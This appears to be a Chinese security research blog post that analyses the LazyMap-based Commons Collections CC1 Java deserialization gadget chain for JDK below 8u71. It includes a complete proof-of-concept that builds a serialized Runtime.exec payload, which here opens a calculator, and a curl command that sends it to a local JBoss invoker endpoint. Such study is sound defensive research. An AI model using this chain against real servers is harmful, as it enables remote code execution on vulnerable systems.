---
created: 2024-10-02T14:04:00+00:00
categories:
  - 技术研究
tags:
  - Java安全
updated: 2023-03-12T00:00:00+00:00
date: 2023-01-05T00:00:00+00:00
slug: java-deserialization-cc1-lazymap
title: Java反序列化漏洞之LazyMap型CC1链
cover: /img/post/java-deserialization-cc1-lazymap/1.png
id: 113906e1-7468-8080-97ba-ccd793082cd8
---

## LazyMap 的由来

在上一篇[《Java 反序列化漏洞之 TransformedMap 型 CC1 链》](https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap)文章中，提到了 2015 年 1 月加州 AppSec 安全会议上，Chris Frohoff 和 Gabe Lawrence 在演讲中就 CommonsCollections1 完整调用链做出了演示，其中所用到的中间 Gadget 链就是`LazyMap`类，在随后发布的 Ysoserial 工具中所包含的 CommonsCollections1 链也同样如此。

那么，本文将会详细分析`LazyMap`作为中间链的这种反序列化利用方式。当然，与`TransformedMap`作为中间 Gadget 链相比，kick-off 入口类与 sink 危害类都是相同的类，所以涉及重复的内容不会再赘述。不过，虽然 sink 类相同，但其中执行的方法却有所不同。

在此之前还需要了解一些前置知识，比如 Java 动态代理机制，当对 LazyMap 作为中间链的反序列化利用方式分析透彻了，对于后面学习其他 Gadget 链也是有帮助的，比如 CommonsCollections3、CommonsCollections5、CommonsCollections6、CommonsCollections7 都有涉及到`LazyMap`类。

## 影响范围

与上一篇文章中提到的影响范围相同，都是影响 JDK 8u71 以下的版本，且 Commons Collections 的版本要求在 3.0 以上、3.2.2 以下。

## 动态代理

Java 中的动态代理是一种在运行时创建代理对象的机制，该代理对象能够拦截对目标对象方法的调用并在调用前后执行额外的逻辑，动态代理通常用于在不修改原始代码的情况下实现日志记录、性能监控、事务管理等功能。

动态代理主要使用`java.lang.reflect.Proxy`类和`java.lang.reflect.InvocationHandler`接口来实现，`Proxy`类用于创建代理对象，而`InvocationHandler`接口则负责处理代理对象方法的调用。如下示例代码，非常清晰地演示了不使用动态代理与使用动态代理之间的差异性，一言以蔽之，被动态代理的对象每执行一个方法，都会调用对应的实现`InvocationHandler`接口类的`invoke`方法。

```java
package com.javasec.proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

class InvocationHandlerDemo implements InvocationHandler {
    protected Object obj;

    public InvocationHandlerDemo(Object obj) {
        this.obj = obj;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().compareTo("get") == 0){
            System.out.println("invoke is called.");
        }
        return method.invoke(this.obj, args);
    }
}

public class ProxyTest {
    public static void main(String[] args) {

        Map map = new HashMap();

        map.put("k", "v");
        // 正常通过键获取值的方式
        System.out.println("k: " + map.get("k"));

        System.out.println("--------------------------");

        // 通过代理的方式
        // 首先先创建InvocationHandler实例
        InvocationHandler invocationHandler = new InvocationHandlerDemo(map);

        // 再创建代理实例对象
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                invocationHandler
        );
        // 最后通过代理对象执行相关操作
        String result = (String) proxyMap.get("k");
        System.out.println("k: " + result);
    }
}

/* 执行结果：
k: v
--------------------------
invoke is called.
k: v
*/
```

## LayzMap#get

`org.apache.commons.collections.map.LazyMap`是一个继承自 AbstractMapDecorator 并用于创建懒加载的装饰类，它实现了`Map`和`Serializable`，其中的`decorate`方法用于创建一个装饰后的`Map`实例，该方法接受一个被装饰的`Map`对象，以及一个工厂对象，后者将作为 Lazymap 的`factory`成员变量。

```java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {

    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;

    public static Map decorate(Map map, Factory factory) {
        return new LazyMap(map, factory);
    }

    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }

    protected LazyMap(Map map, Factory factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = FactoryTransformer.getInstance(factory);
    }

    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = factory;
    }

    public Object get(Object key) {
        // 如果key当前不在map中，则为key创建value
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
}
```

在`LayzMap#get`方法中，先会对传入的 key 进行判断是否存在于`map`中，此处的`map`是父类`AbstractMapDecorator`中的成员变量，且用到了`transient`修饰符，意味着它不会参与序列化，也意味着在反序列化过程中`map`会为空，其中不会包含任何 key，这样就会顺利进入到 if 代码块中，而在其中有对`factory`的`transform`方法进行调用。

```java
public abstract class AbstractMapDecorator implements Map {

    /** The map to decorate */
    protected transient Map map;
    // ...
}
```

那么，当通过`LazyMap.decorate`方法传入一个恶意的`ChainedTransformer`对象作为恶意的`factory`，然后再调用`LayzMap#get`方法，最终就会触发恶意行为。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;

public class LazyMapTest {

    public static void main(String[] args) {
        Transformer[] ts = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a Calculator"})
        };
        Transformer tc = new ChainedTransformer(ts);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), tc);

        lazyMap.get("xx");
    }
}
```

![](/img/post/java-deserialization-cc1-lazymap/containskey.png)

![](/img/post/java-deserialization-cc1-lazymap/0.png)

## AnnotationInvocationHandler#invoke

`AnnotationInvocationHandler`类实现了`InvocationHandler`，这恰恰让人联系到上面的动态代理机制，而且这个类中的`invoke`方法里存在`memberValues.get`方法的调用，这又能够关联到`LayzMap#get`方法。

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658399397L;
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }

    public Object invoke(Object proxy, Method method, Object[] args) {
        String member = method.getName();
        Class<?>[] paramTypes = method.getParameterTypes();

        // Handle Object and Annotation methods
        if (member.equals("equals") && paramTypes.length == 1 &&
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        if (paramTypes.length != 0)
            throw new AssertionError("Too many parameters for an annotation method");

        switch(member) {
        case "toString":
            return toStringImpl();
        case "hashCode":
            return hashCodeImpl();
        case "annotationType":
            return type;
        }

        // Handle annotation member accessors
        Object result = memberValues.get(member);

        // ...

        return result;
    }
}
```

但不过，重写的`readObject`方法中并未涉及到`invoke`相关方法，所以就需要用到动态代理机制，从而执行到`invoke`方法，最终达到执行`get`方法以达到命令的执行。

## 概念验证

结合如上所有，最终构造如下 POC。第一处创建的`AnnotationInvocationHandler`实例是用于利用`invoke`方法触发`LazyMap`中的 get 方法从而达到命令执行，接着会通过调用`Proxy.newProxyInstance()`方法为这个实例创建代理对象 proxyMap，但由于在反序列化的入口是`readObject`方法，所以无法对 proxyMap 直接序列化，所以就需要二次创建`AnnotationInvocationHandler`实例来对 proxyMap 进行包装。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1LazyMap {
    public static void main(String[] args) throws Exception{

        Transformer[] ts = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a Calculator"})
        };
        Transformer tc = new ChainedTransformer(ts);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), tc);

        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        // 创建第一个AnnotationInvocationHandler实例
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        // 调用Proxy.newProxyInstance()方法创建代理对象proxyMap
        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, handler);

        // 第二次创建AnnotationInvocationHandler实例来对proxyMap进行包装
        handler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc1-lazymap.ser"));
        outputStream.writeObject(handler);
        outputStream.close();
//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("cc1-lazymap.ser"));
//        inputStream.readObject();
    }
}
```

向一个存在反序列化漏洞且 JDK 版本小于 8u71 的 Jboss 环境发送如上生成的恶意序列化数据，成功弹出计算器。

```shell
curl -H "Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue" --data-binary "@cc1-lazymap.ser" http://localhost:8080/invoker/readonly
```

![](/img/post/java-deserialization-cc1-lazymap/1.png)

如下是完整 Gadget 调用链。

```
AnnotationInvocationHandler.readObject()
    Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Class.getMethod()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.getRuntime()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
```

![](/img/post/java-deserialization-cc1-lazymap/r.png)

## Debug 导致的小问题

如上 POC 在调试时，在进行序列化时就会弹出计算器，有时候甚至会弹出两个计算器，这些情况在直接运行的情况下反倒不会出现。这其实是由于在本地调试代码时，调试器会调用一些 toString 等方法，这样便触发了 invoke 的调用，从而导致命令执行。有一种非常简单的方式来避免这种行为，在 IDEA 中关闭如下两项即可。

![](/img/post/java-deserialization-cc1-lazymap/2.png)

## 参考

- https://0xf4n9x.github.io/java-deserialization-vulnerability-principle
- https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap
- https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java
- https://mp.weixin.qq.com/s/d5UvL065Lc1WXhsRmb92qw